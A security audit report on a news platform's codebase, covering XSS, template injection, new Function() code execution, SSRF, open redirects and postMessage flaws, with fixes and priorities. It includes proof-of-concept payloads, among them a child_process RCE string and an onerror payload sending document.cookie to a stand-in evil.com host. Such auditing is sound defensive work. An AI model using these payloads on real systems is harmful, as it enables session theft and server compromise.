# Deep XSS & Related Vulnerability Audit V2

## Executive Summary

This audit examined the codebase for XSS vulnerabilities and related security issues. The analysis went beyond surface-level patterns to trace data flows and understand exploitation potential.

---

## 🔴 CRITICAL Vulnerabilities

### 1. Server-Side Template Injection (SSTI) - Code Injection
**File:** `/packages/backend-modules/mail/express/render.js`  
**Severity:** CRITICAL (when endpoint enabled)

```javascript
server.get('/mail/render/:template', async (req, res) => {
  const { html: template } = await getTemplates(req.params.template)
  const queryMergeVars = convertVarObject(req?.query || {})  // ← USER INPUT
  const variables = [...envMergeVars, ...queryMergeVars]
  const getHTML = handlebars.compile(template)
  const html = getHTML(variablesObject)  // ← INJECTED
  return res.send(html)
})
```

**Attack Vector:**
- Templates use `{{{triple_braces}}}` (347 instances across 113 templates)
- Query parameters injected without sanitization
- No authentication required

**PoC:**
```
/mail/render/signin_code?sg_font_faces=<script>alert(document.cookie)</script>
```

**Status:** Endpoint conditionally enabled via `MAIL_EXPRESS_RENDER` env var. Active in development, likely disabled in production.

---

### 2. Code Injection via `new Function()` - Article Metadata
**File:** `/apps/www/components/Article/metadata.js:17`  
**Severity:** HIGH (requires editor access)

```javascript
fn = new Function('query', code)  // code = articleContent.meta.fromQuery
return fn(query)
```

**Attack Vector:** An editor can inject arbitrary JavaScript into article metadata via `meta.fromQuery`. This code executes on the server during SSR and potentially client-side.

**PoC (article metadata):**
```json
{
  "meta": {
    "fromQuery": "return process.mainModule.require('child_process').execSync('id').toString()"
  }
}
```

---

### 3. Code Injection via `unsafeDatumFn` - Chart Component
**File:** `/packages/styleguide/src/components/Chart/utils.js:257`  
**Severity:** HIGH (requires editor access)

```javascript
export const unsafeDatumFn = (code) => new Function('datum', `return ${code}`)
```

**Attack Vector:** Editor-controlled chart configurations can inject JavaScript that executes when charts render.

---

## 🟠 HIGH Vulnerabilities

### 4. Stored XSS via Twitter Embeds
**Files:**
- `/packages/backend-modules/embeds/lib/twitter/index.js`
- `/packages/styleguide/src/components/Social/Tweet.js`

**Vulnerability:**
```javascript
// Twitter text processing
const html = sanitizedText
  ? Autolinker.link(sanitizedText, { mention: 'twitter' }).replace(/\n/g, '<br/>')
  : null

// Rendered without DOMPurify
<div dangerouslySetInnerHTML={{ __html: html }} />
```

**Attack Vector:** Malicious tweet content could contain XSS payloads that bypass Autolinker's processing.

---

### 5. postMessage Origin Validation Missing
**Files:**
- `/apps/www/lib/withInNativeApp.js`
- `/apps/www/components/NativeApp/MessageSync.js`

```javascript
document.addEventListener('message', ({ data }) => {
  const message = parseJSONObject(data)
  if (message.type === 'push-route') {
    Router.push(message.url)  // ← No origin check
  }
})
```

**Attack Vector:** Any page with an iframe embedding the app can send messages to trigger navigation, potentially to phishing pages.

---

## 🟡 MEDIUM Vulnerabilities

### 6. Editor-Controlled HTML Injection Points

#### a) DynamicComponent (MDAST code blocks)
**File:** `/packages/styleguide/src/components/DynamicComponent/index.js`
```javascript
<div dangerouslySetInnerHTML={{ __html: html }} />  // html from code blocks
```

#### b) IllustrationHtml (ai2html)
**File:** `/packages/styleguide/src/components/IllustrationHtml/index.js`
```javascript
<div dangerouslySetInnerHTML={{ __html: code }} />  // code from MDAST
```

#### c) ExpandableLink Description
**File:** `/packages/styleguide/src/components/ExpandableLink/ExpandableLinkCallout.tsx`
```javascript
<RawHtml dangerouslySetInnerHTML={{ __html: expandedLink.description }} />
```

#### d) Gallery Captions
**File:** `/apps/www/components/Gallery/Gallery.js`
```javascript
captionEl.children[0].innerHTML = innerHtml.join(' ')  // caption, byLine
```

**Risk:** All require editor privileges but allow arbitrary HTML/JS injection in articles.

---

### 7. SSRF via Link Preview
**File:** `/packages/backend-modules/embeds/lib/linkPreview/index.js`

```javascript
const getLinkPreviewByUrl = async (url) => {
  const response = await fetch(url).then(...)  // Fetches arbitrary URLs
}
```

**Mitigation:** The `embed` GraphQL query requires `editor` role, limiting exploitation.

---

### 8. Open Redirect via Redirections
**File:** `/packages/backend-modules/redirections/lib/Redirections.js`

```javascript
const validateTarget = (target) => {
  const targetUrl = new URL(target, base)
  // External URLs pass validation!
  if (![target, encodeURI(target)].includes(targetUrl.toString().replace(base, ''))) {
    throw new Error(`target "${target}" is invalid.`)
  }
}
```

**Mitigation:** 
- Requires editor/admin role to create redirections
- Frontend shows warning and delay for external redirects

---

### 9. Open Redirect via Draft Preview (Secret Required)
**File:** `/apps/www/src/app/api/draft/preview/route.ts`

```javascript
if (!path || !path.startsWith('/')) {
  return new Response('Invalid query', { status: 401 })
}
redirect(path)  // path could be //evil.com
```

**Vulnerability:** `//evil.com` starts with `/` but is a protocol-relative URL that redirects to external domain.

**PoC:**
```
/api/draft/preview?secret=LEAKED_SECRET&path=//evil.com
```

**Mitigation:** Requires knowledge of `DRAFT_MODE_SECRET`. Fix: Check `!path.startsWith('//')`

---

## ✅ PROPERLY SECURED Areas

### 1. Search Results - DOMPurify Sanitization
**File:** `/apps/www/lib/sanitizeHTML.ts`
```javascript
export function sanitizeSearchResultHTML(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['em'],
    ALLOWED_ATTR: [],
  })
}
```
Search components properly sanitize highlighted results.

### 2. Comment Content in Emails
**File:** `/packages/mdast/mail-templates/src/comment/schema.jsx`
```javascript
{
  matchMdast: matchType('html'),
  component: ({ value }) => <span>{value}</span>,  // React escapes
}
```
Comment HTML is escaped through React's JSX rendering.

### 3. Username Validation
**File:** `/packages/backend-modules/auth/lib/checkUsername.js`
```javascript
if (!username.match(/^[.a-z0-9]+$/)) {
  throw new Error(t('api/checkUsername/invalid'))
}
```
Usernames restricted to alphanumeric characters only.

### 4. Profile URLs
**File:** `/packages/backend-modules/auth/lib/checkProfileUrls.js`
```javascript
return isURL(url, {
  protocols: ['https', 'http'],  // No javascript:, data:, etc.
})
```

### 5. Portrait Images
Portraits are converted to JPEG via `sharp()`, preventing SVG XSS.

### 6. Redirection Query Path Validation
**File:** `/packages/backend-modules/redirections/graphql/resolvers/_queries/redirection.js`
```javascript
if (pathUrl.origin !== FRONTEND_BASE_URL) {
  return null
}
```

---

## Attack Scenarios

### Scenario 1: Compromised Editor Account
1. Editor creates article with malicious `meta.fromQuery`
2. When article is rendered (SSR or client), arbitrary code executes
3. Could steal admin credentials, modify content, or pivot to backend

### Scenario 2: SSTI Email Exploitation (if enabled)
1. Attacker discovers `/mail/render/:template` endpoint is enabled
2. Sends crafted URL: `/mail/render/signin_code?name=<img src=x onerror=fetch('//evil.com/'+document.cookie)>`
3. Victim clicks link, credentials stolen

### Scenario 3: postMessage Exploitation
1. Attacker creates page with iframe to republik.ch
2. Sends `postMessage({ type: 'push-route', url: '/angebote?phishing=1' })`
3. App navigates to attacker-controlled content

---

## Recommendations

### Immediate Actions
1. **Disable `/mail/render` endpoint** in production (verify `MAIL_EXPRESS_RENDER=false`)
2. **Add Content-Security-Policy headers** to prevent inline script execution
3. **Validate postMessage origins** in native app message handlers

### Short-term Actions
4. **Replace `new Function()` with safe alternatives:**
   - Use AST-based expression evaluation
   - Or whitelist specific query transformations
5. **Sanitize editor-controlled HTML** with DOMPurify before rendering
6. **Add SSRF protection** - validate URLs against allowlist before fetching

### Long-term Actions
7. **Security audit of all `dangerouslySetInnerHTML` usage**
8. **Implement Content-Security-Policy** with nonce-based inline scripts
9. **Add security headers** (X-Content-Type-Options, X-Frame-Options, etc.)

---

## Risk Assessment Matrix

| Vulnerability | Severity | Exploitability | Impact | Auth Required |
|--------------|----------|----------------|--------|---------------|
| SSTI Mail Render | Critical | Easy | Full XSS | None |
| new Function() metadata | High | Medium | RCE/XSS | Editor |
| unsafeDatumFn charts | High | Medium | XSS | Editor |
| Twitter Embed XSS | High | Hard | Stored XSS | Editor |
| postMessage no origin | Medium | Medium | Navigation | None |
| Editor HTML injection | Medium | Easy | XSS | Editor |
| SSRF Link Preview | Medium | Easy | SSRF | Editor |
| Open Redirect | Medium | Easy | Phishing | Editor |

---

## Files Analyzed

- `apps/www/**` - Frontend React application
- `packages/backend-modules/**` - Backend modules
- `packages/styleguide/**` - UI component library
- `packages/mdast/**` - Markdown processing

**Total dangerouslySetInnerHTML usages:** 50+
**Total innerHTML usages:** 5+
**Code execution points:** 2 (`new Function()`)
**Server-side fetch endpoints:** 6+
**Email templates with unescaped content:** 113

---

## Testing Notes

1. The `/mail/render` SSTI was tested but returned 404, indicating the endpoint is disabled in the current deployment
2. `new Function()` vulnerabilities require editor access to exploit
3. postMessage vulnerabilities require victim to visit attacker-controlled page

---

## Additional Low Severity Findings

### 10. Potential HTTP Response Header Injection
**File:** `/apps/www/pages/api/pgp/[userSlug].ts:54`

```javascript
res.setHeader(
  'Content-Disposition',
  `attachment; filename="${user.username || user.name}.asc"`,
)
```

**Issue:** `user.name` (firstName + lastName) has no character validation beyond length. Could contain CRLF characters.

**Mitigation:** Modern Node.js (v14+) throws on invalid header characters. Low risk in practice.

---

### 11. GraphQL Introspection Enabled
**File:** `/packages/backend-modules/base/express/graphql.js:115`

```javascript
introspection: true,
```

**Issue:** Schema introspection reveals all types, queries, mutations which aids attackers.

**Mitigation:** Not critical as this is typically acceptable for public APIs.

---

### 12. Long JWT Expiration
**File:** `/packages/backend-modules/auth/lib/CookieOptions.js`

```javascript
const CookieExpirationTimeInMS = {
  DEFAULT_MAX_AGE: 60000 * 60 * 24 * 365, // 1 year
}
```

**Issue:** 1-year JWT expiration is quite long. If token is stolen, it remains valid for extended period.

---

## Security Strengths Found

1. **Rate Limiting:** Authentication attempts are rate-limited per email/session
2. **GraphQL Cost Limiting:** Queries have depth (20) and cost (100,000) limits
3. **Email Non-Enumeration:** Sign-in returns same response for existing/non-existing emails
4. **Username Validation:** Only `[.a-z0-9]+` allowed
5. **Profile URL Validation:** Only http/https protocols accepted
6. **CSRF Protection:** SameSite=None + Secure cookies in production
7. **DOMPurify:** Used for search result sanitization
8. **MDAST Safe Rendering:** HTML in markdown is escaped

---

## Attack Chain Scenarios

### Chain 1: Editor Account Compromise → RCE
1. Compromise editor account (phishing, credential stuffing)
2. Create article with malicious `meta.fromQuery`
3. Execute arbitrary code on server during SSR
4. Escalate to admin or pivot to internal services

### Chain 2: SSTI → Session Hijacking (if mail/render enabled)
1. Find deployment with `MAIL_EXPRESS_RENDER=true`
2. Send victim link: `/mail/render/template?var=<script>...</script>`
3. Steal session cookies via JavaScript
4. Access victim's account

### Chain 3: XSS in Article → postMessage Exploitation
1. Editor injects XSS via IllustrationHtml
2. XSS payload uses postMessage to send navigation commands
3. Redirects victims to phishing pages or performs actions

---

## Remediation Priority

| Priority | Finding | Effort |
|----------|---------|--------|
| P0 | Verify mail/render disabled in prod | Low |
| P1 | Add origin validation to postMessage | Medium |
| P1 | Replace new Function() with safe alternative | High |
| P2 | Sanitize editor HTML with DOMPurify | Medium |
| P2 | Add CSP headers | Medium |
| P3 | Review JWT expiration policy | Low |
| P3 | Disable GraphQL introspection in prod | Low |

---

*Audit performed: December 2024*
*Version: V2 - Deep Analysis Complete*
